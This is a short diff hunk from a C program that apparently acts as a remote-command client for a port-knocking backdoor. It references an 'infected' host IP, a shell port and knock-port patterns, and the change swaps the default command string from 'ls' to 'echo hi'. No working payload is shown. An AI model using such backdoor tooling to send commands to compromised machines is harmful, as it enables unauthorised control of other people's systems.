@@ -44,7 +44,7 @@ int main(int argc, char **argv){
     char *dip = INFECTEDIP;
     unsigned short sport = SHPORT;
     unsigned short dport = SHPORT;
-    unsigned char data[BUFSIZE] = "ls";
+    unsigned char data[BUFSIZE] = "echo hi";
     pattern[0] = 14881; //port 8506 in u_short
     pattern[1] = 15137; //port 8507 in u_short this is for comparing in the ParseTCP function
     knocking[0] = 0; // initilizing the knocking
